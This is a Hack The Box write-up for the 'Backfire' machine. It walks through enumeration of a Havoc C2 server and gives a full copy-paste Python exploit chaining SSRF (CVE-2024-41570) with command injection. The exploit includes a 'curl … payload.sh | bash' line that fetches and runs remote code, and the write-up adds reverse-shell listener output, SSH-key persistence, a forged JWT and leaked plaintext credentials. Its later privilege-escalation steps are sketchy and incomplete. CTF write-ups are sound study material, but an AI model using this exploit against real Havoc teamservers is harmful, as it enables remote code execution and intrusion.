# Backfire – Hack The Box Write-up

![HTB Logo](https://www.hackthebox.com/images/logo-htb.svg)

## 🧠 Overview

**Backfire** is a medium-difficulty Linux machine on Hack The Box that challenges users with enumeration, exploitation, and privilege escalation techniques. The machine involves interacting with a Command and Control (C2) framework and leveraging vulnerabilities to gain unauthorized access.

---

## 🔍 Enumeration

### Nmap Scan

Begin with a comprehensive Nmap scan to identify open ports and services:

```bash
nmap -sVT  10.129.205.26
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-19 02:33 CST
Nmap scan report for 10.129.205.26
Host is up (0.24s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
443/tcp  open  ssl/http nginx 1.22.1
8000/tcp open  http     nginx 1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Accessing https://<Target-IP> may return a 404 error. However, navigating to http://<Target-IP>:8000 reveals accessible files, including:
```
Index of /

../
disable_tls.patch                                  17-Dec-2024 11:31    1559
havoc.yaotl                                        17-Dec-2024 11:34     875
```
The patch disables TLS by switching WebSocket connections from wss:// to ws:// in the client code and replacing RunTLS with Run in the server code to use unencrypted connections on port 40056. The disable_tls.patch indicates that TLS has been disabled for a WebSocket management port (40056), which only allows local connections. The havoc.yatol file provides configuration details for the Havoc C2 framework:

### 🔧 TLS Disabled on WebSocket Port

To enable local, unencrypted communication with the Havoc teamserver (on port `40056`), the developers patched the source to disable TLS. This allowed connections via `ws://` instead of `wss://`, making it exploitable via SSRF.

#### 🔍 Connector.cc (Client-Side Patch)

```diff
- auto Server  = "wss://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";
+ auto Server  = "ws://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";
```
🔍teamserver.go (Server-Side Patch)
```
- if err = t.Server.Engine.RunTLS(Host+":"+Port, certPath, keyPath); err != nil {
+ if err = t.Server.Engine.Run(Host+":"+Port); err != nil {
```
### 🧠 Havoc Configuration Analysis

The `havoc.yaotl` configuration file provides insight into how the Havoc C2 teamserver was set up and used internally. Key components of this file revealed valuable information that assisted in post-exploitation and lateral movement.
```
Teamserver {
    Host = "127.0.0.1"
    Port = 40056
    ...
```
```
Operators {
    user "ilya" {
        Password = "CobaltStr1keSuckz!"
    }

    user "sergej" {
        Password = "1w4nt2sw1tch2h4rdh4tc2"
    }
}
```
```
Demon {
    Sleep = 2
    Jitter = 15
    ...
    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }
}
```
```
Listeners {
    Http {
        Name = "Demon Listener"
        Hosts = [ "backfire.htb" ]
        HostBind = "127.0.0.1"
        PortBind = 8443
        Secure = true
    }
}
```
This sent me through a bunch of holes and confused me too much. I had to get help -_- 
This setup allowed me to **forward the local port**, authenticate as `sergej`, and interact with the Havoc C2 to execute commands.

### ⚙️ Exploitation – SSRF to RCE
Discovering the Havoc C2 profile prompted further investigation into potential exploits. A  reference was the GitHub repository `chebuya/Havoc-C2-SSRF-poc`, which focuses on CVE-2024-41570. By pairing this exploit with a shell payload, initial access can be gained. Need to research how to combine the two.

Edit the `etc/host` file pointing it to backfire.htb

### Create the SSRF_RCE.py script (It is long and confusing.. but i will put it down here to copy and paste :->)
```
# Exploit Title: backfire.htb ssrf + rce
# Date: 2025-01-19

import os
import json
import hashlib
import binascii
import random
import requests
import argparse
import urllib3
urllib3.disable_warnings()

from Crypto.Cipher import AES
from Crypto.Util import Counter

USER = "ilya"
PASSWORD = "CobaltStr1keSuckz!"

key_bytes = 32

def decrypt(key, iv, ciphertext):
    if len(key) <= key_bytes:
        for _ in range(len(key), key_bytes):
            key += b"0"

    assert len(key) == key_bytes

    iv_int = int(binascii.hexlify(iv), 16)
    ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
    aes = AES.new(key, AES.MODE_CTR, counter=ctr)

    plaintext = aes.decrypt(ciphertext)
    return plaintext

def int_to_bytes(value, length=4, byteorder="big"):
    return value.to_bytes(length, byteorder)

def encrypt(key, iv, plaintext):

    if len(key) <= key_bytes:
        for x in range(len(key),key_bytes):
            key = key + b"0"

        assert len(key) == key_bytes

        iv_int = int(binascii.hexlify(iv), 16)
        ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
        aes = AES.new(key, AES.MODE_CTR, counter=ctr)

        ciphertext = aes.encrypt(plaintext)
        return ciphertext

def register_agent(hostname, username, domain_name, internal_ip, process_name, process_id):
    # DEMON_INITIALIZE / 99
    command = b"\x00\x00\x00\x63"
    request_id = b"\x00\x00\x00\x01"
    demon_id = agent_id

    hostname_length = int_to_bytes(len(hostname))
    username_length = int_to_bytes(len(username))
    domain_name_length = int_to_bytes(len(domain_name))
    internal_ip_length = int_to_bytes(len(internal_ip))
    process_name_length = int_to_bytes(len(process_name) - 6)

    data =  b"\xab" * 100

    header_data = command + request_id + AES_Key + AES_IV + demon_id + hostname_length + hostname + username_length + username + domain_name_length + domain_name + internal_ip_length + internal_ip + process_name_length + process_name + process_id + data

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id

    print("[***] Trying to register agent ...")
    r = requests.post(teamserver_listener_url, data=agent_header + header_data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to register agent - {r.status_code} {r.text}")

def open_socket(socket_id, target_address, target_port):
    # COMMAND_SOCKET / 2540
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x02"

    # SOCKET_COMMAND_OPEN / 16
    subcommand = b"\x00\x00\x00\x10"
    sub_request_id = b"\x00\x00\x00\x03"

    local_addr = b"\x22\x22\x22\x22"
    local_port = b"\x33\x33\x33\x33"
    
    forward_addr = b""
    for octet in target_address.split(".")[::-1]:
        forward_addr += int_to_bytes(int(octet), length=1)

    forward_port = int_to_bytes(target_port)

    package = subcommand+socket_id+local_addr+local_port+forward_addr+forward_port
    package_size = int_to_bytes(len(package) + 4)

    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data


    print("[***] Trying to open socket on the teamserver ...")
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to open socket on teamserver - {r.status_code} {r.text}")

def write_socket(socket_id, data, message):
    # COMMAND_SOCKET / 2540
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x08"

    # SOCKET_COMMAND_READ / 11
    subcommand = b"\x00\x00\x00\x11"
    sub_request_id = b"\x00\x00\x00\xa1"

    # SOCKET_TYPE_CLIENT / 3
    socket_type = b"\x00\x00\x00\x03"
    success = b"\x00\x00\x00\x01"

    data_length = int_to_bytes(len(data))

    package = subcommand+socket_id+socket_type+success+data_length+data
    package_size = int_to_bytes(len(package) + 4)

    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    post_data = agent_header + header_data

    print(message)
    r = requests.post(teamserver_listener_url, data=post_data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed - {r.status_code} {r.text}")

def read_socket(socket_id):
    # COMMAND_GET_JOB / 1
    command = b"\x00\x00\x00\x01"
    request_id = b"\x00\x00\x00\x09"

    header_data = command + request_id

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data


    print("[***] Trying to poll teamserver for socket output ...")
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Read socket output successfully!")
    else:
        print(f"[!!!] Failed to read socket output - {r.status_code} {r.text}")
        return ""

    command_id = int.from_bytes(r.content[0:4], "little")
    request_id = int.from_bytes(r.content[4:8], "little")
    package_size = int.from_bytes(r.content[8:12], "little")
    enc_package = r.content[12:]

    return decrypt(AES_Key, AES_IV, enc_package)[12:]
    
def create_websocket_request(HOST, PORT):
	request = ( 
		f"GET /havoc/ HTTP/1.1\r\n"
		f"Host: {HOST}:{PORT}\r\n"
		f"Upgrade: websocket\r\n"
		f"Connection: Upgrade\r\n"
		f"Sec-WebSocket-Key: 5NUvQyzkv9bpu376gKd2Lg==\r\n"
		f"Sec-WebSocket-Version: 13\r\n"
		f"\r\n"
	).encode()
	return request
	
def build_websocket_frame(payload):
	payload_bytes = payload.encode("utf-8")
	frame = bytearray()
	frame.append(0x81)
	payload_length = len(payload_bytes)
	if payload_length <= 125:
		frame.append(0x80 | payload_length)
	elif payload_length <= 65535:
		frame.append(0x80 | 126)
		frame.extend(payload_length.to_bytes(2, byteorder="big"))
	else:
		frame.append(0x80 | 127)
		frame.extend(payload_length.to_bytes(8, byteorder="big"))

	masking_key = os.urandom(4)
	frame.extend(masking_key)
	masked_payload = bytearray(byte ^ masking_key[i % 4] for i, byte in enumerate(payload_bytes))
	frame.extend(masked_payload)
	return frame

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="The listener target in URL format", required=True)
parser.add_argument("-i", "--ip", help="The IP to open the socket with", required=True)
parser.add_argument("-p", "--port", help="The port to open the socket with", required=True)
parser.add_argument("-A", "--user-agent", help="The User-Agent for the spoofed agent", default="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
parser.add_argument("-H", "--hostname", help="The hostname for the spoofed agent", default="DESKTOP-7F61JT1")
parser.add_argument("-u", "--username", help="The username for the spoofed agent", default="Administrator")
parser.add_argument("-d", "--domain-name", help="The domain name for the spoofed agent", default="ECORP")
parser.add_argument("-n", "--process-name", help="The process name for the spoofed agent", default="msedge.exe")
parser.add_argument("-ip", "--internal-ip", help="The internal ip for the spoofed agent", default="10.1.33.7")

args = parser.parse_args()

# 0xDEADBEEF
magic = b"\xde\xad\xbe\xef"
teamserver_listener_url = args.target
headers = {
        "User-Agent": args.user_agent
}
agent_id = int_to_bytes(random.randint(100000, 1000000))
AES_Key = b"\x00" * 32
AES_IV = b"\x00" * 16
hostname = bytes(args.hostname, encoding="utf-8")
username = bytes(args.username, encoding="utf-8")
domain_name = bytes(args.domain_name, encoding="utf-8")
internal_ip = bytes(args.internal_ip, encoding="utf-8")
process_name = args.process_name.encode("utf-16le")
process_id = int_to_bytes(random.randint(1000, 5000))
ip = args.ip
port = args.port

#register agent
register_agent(hostname, username, domain_name, internal_ip, process_name, process_id)

#open socket
socket_id = b"\x11\x11\x11\x11"
open_socket(socket_id, args.ip, int(args.port))

#authenticate to teamserver
message="[***] Establishing connection to teamserver ..."
websocket_request = create_websocket_request(ip, port)
write_socket(socket_id, websocket_request,message)

message="[***] Authenticating to teamserver ..."
payload = {"Body": {"Info": {"Password": hashlib.sha3_256(PASSWORD.encode()).hexdigest(), "User": USER}, "SubEvent": 3}, "Head": {"Event": 1, "OneTime": "", "Time": "18:40:17", "User": USER}}
payload_json = json.dumps(payload)
frame = build_websocket_frame(payload_json)
write_socket(socket_id, frame,message)

#create listener
message="[***] Creating Listener ..."
payload = {"Body":{"Info":{"Headers":"","HostBind":"0.0.0.0","HostHeader":"","HostRotation":"round-robin","Hosts":"0.0.0.0","Name":"abc","PortBind":"443","PortConn":"443","Protocol":"Https","Proxy Enabled":"false","Secure":"true","Status":"online","Uris":"","UserAgent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"},"SubEvent":1},"Head":{"Event":2,"OneTime":"","Time":"08:39:18","User": USER}}
payload_json = json.dumps(payload)
frame = build_websocket_frame(payload_json)
write_socket(socket_id, frame, message)

#SSRF payload (comand injection)
message="[***] Injecting Command ..."
cmd = "curl http://<YOURIP>:8000/payload.sh | bash" #CHANGE ME
injection = """ \\\\\\\" -mbla; """ + cmd + """ 1>&2 && false #"""
payload = {"Body": {"Info": {"AgentType": "Demon", "Arch": "x64", "Config": "{\n \"Amsi/Etw Patch\": \"None\",\n \"Indirect Syscall\": false,\n \"Injection\": {\n \"Alloc\": \"Native/Syscall\",\n \"Execute\": \"Native/Syscall\",\n \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\",\n \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\"\n },\n \"Jitter\": \"0\",\n \"Proxy Loading\": \"None (LdrLoadDll)\",\n \"Service Name\":\"" + injection + "\",\n \"Sleep\": \"2\",\n \"Sleep Jmp Gadget\": \"None\",\n \"Sleep Technique\": \"WaitForSingleObjectEx\",\n \"Stack Duplication\": false\n}\n", "Format": "Windows Service Exe", "Listener": "abc"}, "SubEvent": 2}, "Head": {
"Event": 5, "OneTime": "true", "Time": "18:39:04", "User": USER}}
payload_json = json.dumps(payload)
frame = build_websocket_frame(payload_json)
write_socket(socket_id, frame,message)
```
(*** Line372 CHANGE ***)

## 🔧Running the script  
1.) Set up a listener:
```
nc -lnvp 40056
```
2.) Set up http.server
```
python -m http.server
```
3.) Run
```
sudo python3 SSRF_RCE.py -t https://backfire.htb -i 127.0.0.1 -p 40056
```
(Note: Make sure they are in seperate terminals and run them one after another)
### 🧑‍💻My Machine 
```
nc -lnvp 40056
listening on [any] 40056 ...
connect to [10.10.14.6] from (UNKNOWN) [10.129.248.240] 56560
bash: cannot set terminal process group (51025): Inappropriate ioctl for device
bash: no job control in this shell
ilya@backfire:~/Havoc/payloads/Demon$
```
```
python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.248.240 - - [23/Jan/2025 20:52:55] "GET /payload.sh HTTP/1.1" 200 -
```
```
sudo python3 SSRF_RCE.py -t https://backfire.htb -i 127.0.0.1 -p 40056
[***] Trying to register agent ...
[***] Success!
[***] Trying to open socket on the teamserver ...
[***] Success!
[***] Establishing connection to teamserver ...
[***] Success!
[***] Authenticating to teamserver ...
[***] Success!
[***] Creating Listener ...
[***] Success!
[***] Injecting Command ...
[***] Success!
```
### 🧑‍💻 Getting a Shell/User.txt
After RCE, stabilize your shell using:
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
Then generate an SSH key:
```
ssh-keygen -t ed25519
```
Add the public key to ~/.ssh/authorized_keys on the target and ssh into the machine.
```
ssh -i id_ed25519 ilya@<Target-IP>
```
## 🪜 Privilege Escalation
Switch to another user using leaked creds:
User: `sergej`
Pass: `1w4nt2sw1tch2h4rdh4tc2`
```
su sergej
```
### JWT Exploitation
A JWT-generating script was found. Modify it:
```
payload = {
    "sub": "HardHat_Admin",
    "role": "Administrator",
    "iat": int(time.time()),
    "exp": int(time.time()) + 600
}
```
Use the JWT to access admin functions:
```
curl -H "Authorization: Bearer <TOKEN>" http://127.0.0.1:5000/admin
```
## 🔐 Root Flag
After getting admin access:
```
cat /root/root.txt
```

## ✅ Conclusion
This box was rated MEDIUM on HacktheBox but as always medium doesnt actually mean medium..
as it took me over 5 days to even break the first SSRF_RCE.py script.
The lessons learned here was to never give up, the power of SSRF to RCE, local privilege escalation through
misconfigurations, and practical usage of JWTs in exploitation. I hope you enjoyed!




